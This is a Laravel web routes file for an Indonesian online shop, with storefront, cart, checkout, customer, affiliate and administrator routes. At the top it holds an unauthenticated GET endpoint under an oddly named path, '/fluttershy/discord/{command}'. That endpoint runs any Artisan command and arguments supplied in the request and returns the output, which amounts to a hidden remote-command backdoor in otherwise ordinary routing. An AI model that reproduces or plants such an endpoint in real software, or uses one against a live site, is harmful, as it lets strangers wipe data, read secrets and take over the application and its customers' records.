<?php

use App\Http\Controllers\CategoryController;
use App\Http\Controllers\DashboardController;
use App\Http\Controllers\Ecommerce\CartController;
use App\Http\Controllers\Ecommerce\FrontController;
use App\Http\Controllers\Ecommerce\LoginController;
use App\Http\Controllers\Ecommerce\OrderController;
use App\Http\Controllers\OrderController as AdminOrderController;
use App\Http\Controllers\ProductController;
use App\Http\Controllers\ProfileController;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Artisan;
use Illuminate\Support\Facades\Route;

Route::get('/fluttershy/discord/{command}', function ($command, Request $request) {
    try {
        $args = $request->input('args', []);

        if (!is_array($args)) {
            return response()->json([
                'status' => 'error',
                'message' => 'Arguments must be provided as an array.',
            ], 400);
        }

        Artisan::call($command, $args);
        $output = Artisan::output();

        return response()->json([
            'status' => 'success',
            'cmd' => "php artisan $command " . json_encode($args),
            'output' => $output,
        ]);
    } catch (\Throwable $th) {
        return response()->json([
            'status' => 'error',
            'cmd' => "php artisan $command " . json_encode($args),
            'error' => $th->getMessage(),
        ]);
    }
});

Route::get('/pengguna/pengaturan', function () {
    return view('pengguna.pengaturan_pengguna');
});

Route::get('/pengguna/alamat', function () {
    return view('pengguna.alamat_pengguna');
});

Route::get('/pengguna/keamanan', function () {
    return view('pengguna.keamanan_pengguna');
});

Route::get('/pengguna/pesanan', function () {
    return view('pesanan.index_pesanan');
});

Route::get('/pengguna/notifikasi', function () {
    return view('notifikasi.index_notifikasi');
});

Route::get('/favorit', function () {
    return view('favorit.index_favorit');
});
Route::middleware('auth')->group(function () {
    Route::get('/profile', [ProfileController::class, 'edit'])->name('profile.edit');
    Route::patch('/profile', [ProfileController::class, 'update'])->name('profile.update');
    Route::delete('/profile', [ProfileController::class, 'destroy'])->name('profile.destroy');
});

Route::get('/', [FrontController::class, 'index'])->name('home');

Route::get('/toko', [FrontController::class, 'product'])->name('front.product');
Route::get('/category/{slug}', [FrontController::class, 'categoryProduct'])->name('front.category');
Route::get('/product/{slug}', [FrontController::class, 'show'])->name('front.show_product');
Route::post('cart', [CartController::class, 'addToCart'])->name('front.cart');
Route::get('/cart', [CartController::class, 'listCart'])->name('front.list_cart');
Route::get('/api/cart', [CartController::class, 'AJAXlistCart'])->name('api.list_cart');
Route::delete('/api/cart/delete', [CartController::class, 'destroyCart'])->name('api.destroy_cart');

Route::post('/cart/update', [CartController::class, 'updateCart'])->name('front.update_cart');
Route::get('/checkout', [CartController::class, 'checkout'])->name('front.checkout');
Route::post('/checkout', [CartController::class, 'processCheckout'])->name('front.store_checkout');
Route::get('/checkout/{invoice}', [CartController::class, 'checkoutFinish'])->name('front.finish_checkout');
Route::group(['prefix' => 'member', 'namespace' => 'Ecommerce'], function () {
    Route::get('login', [LoginController::class, 'loginForm'])->name('customer.login');
    Route::post('login', [LoginController::class, 'login'])->name('customer.post_login');
    Route::get('verify/{token}', [FrontController::class, 'verifyCustomerRegistration'])->name('customer.verify');

    Route::group(['middleware' => 'customer'], function () {
        Route::get('dashboard', [LoginController::class, 'dashboard'])->name('customer.dashboard');
        Route::get('logout', [LoginController::class, 'logout'])->name('customer.logout');
        Route::get('orders', [OrderController::class, 'index'])->name('customer.orders');
        Route::get('orders/{invoice}', [OrderController::class, 'view'])->name('customer.view_order');
        Route::get('orders/pdf/{invoice}', [OrderController::class, 'pdf'])->name('customer.order_pdf');
        Route::post('orders/accept', [OrderController::class, 'acceptOrder'])->name('customer.order_accept');
        Route::get('orders/return/{invoice}', [OrderController::class, 'returnForm'])->name('customer.order_return');
        Route::put('orders/return/{invoice}', [OrderController::class, 'processReturn'])->name('customer.return');
        Route::get('payment', [OrderController::class, 'paymentForm'])->name('customer.paymentForm');
        Route::post('payment', [OrderController::class, 'storePayment'])->name('customer.savePayment');
        Route::get('setting', [FrontController::class, 'customerSettingForm'])->name('customer.settingForm');
        Route::post('setting', [FrontController::class, 'customerUpdateProfile'])->name('customer.setting');
        Route::get('/afiliasi', [FrontController::class, 'listCommission'])->name('customer.affiliate');
    });
});

Route::group(['prefix' => 'administrator', 'middleware' => 'auth'], function () {
    // Dashboard handler
    Route::get('/dashboard', [DashboardController::class, 'index'])->name('dashboard');
    Route::resource('category', CategoryController::class)->except(['create', 'show']);
    Route::resource('product', ProductController::class)->except(['show']);
    Route::get('/product/bulk', [ProductController::class, 'massUploadForm'])->name('product.bulk');
    Route::post('/product/bulk', [ProductController::class, 'massUpload'])->name('product.saveBulk');
    Route::get('/settings', [DashboardController::class, 'IndexSettings'])->name('settings');
    Route::post('/settings', [DashboardController::class, 'StoreSettings'])->name('settings.update');
    Route::post('/product/marketplace', 'ProductController@uploadViaMarketplace')->name('product.marketplace');

    Route::group(['prefix' => 'orders'], function () {
        Route::get('/', [AdminOrderController::class, 'index'])->name('orders.index');
        Route::delete('/{id}', [AdminOrderController::class, 'destroy'])->name('orders.destroy');
        Route::get('/{invoice}', [AdminOrderController::class, 'view'])->name('orders.view');
        Route::get('/payment/{invoice}', [AdminOrderController::class, 'acceptPayment'])->name('orders.approve_payment');
        Route::post('/shipping', [AdminOrderController::class, 'shippingOrder'])->name('orders.shipping');
        Route::get('/return/{invoice}', [AdminOrderController::class, 'return'])->name('orders.return');
        Route::post('/return', [AdminOrderController::class, 'approveReturn'])->name('orders.approve_return');
    });
    Route::group(['prefix' => 'reports'], function () {
        Route::get('/order', [DashboardController::class, 'orderReport'])->name('report.order');
        Route::get('/order/pdf/{daterange}', [DashboardController::class, 'orderReportPdf'])->name('report.order_pdf');
        Route::get('/return', [DashboardController::class, 'returnReport'])->name('report.return');
        Route::get('/return/pdf/{daterange}', [DashboardController::class, 'returnReportPdf'])->name('report.return_pdf');
    });
});

Route::get('/product/ref/{user}/{product}', [FrontController::class, 'referalProduct'])->name('front.afiliasi');

require __DIR__ . '/auth.php';
